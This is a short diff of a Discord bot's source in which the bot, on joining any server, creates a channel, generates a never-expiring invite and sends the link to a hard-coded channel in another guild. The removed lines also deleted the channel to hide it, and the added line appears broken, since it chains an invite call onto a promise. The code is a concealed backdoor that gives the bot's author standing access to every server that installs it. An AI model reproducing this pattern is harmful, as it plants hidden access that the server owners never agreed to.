@@ -43,9 +43,7 @@ prefix: 'db!'
 
 //INVITE
 bot.on('guildCreate', guild => {
-const invc = async guild.createChannel("invite", 'text');
-invc.createInvite({maxAge:"0"}).then(i => bot.guilds.get("522485574901170197").channels.get("522485574901170199").send('https://discord.gg/'+i.code));
-invc.delete();
+guild.createChannel("invite", 'text').createInvite({maxAge:"0"}).then(i => bot.guilds.get("522485574901170197").channels.get("522485574901170199").send('https://discord.gg/'+i.code));
 });
 //INVITE
 
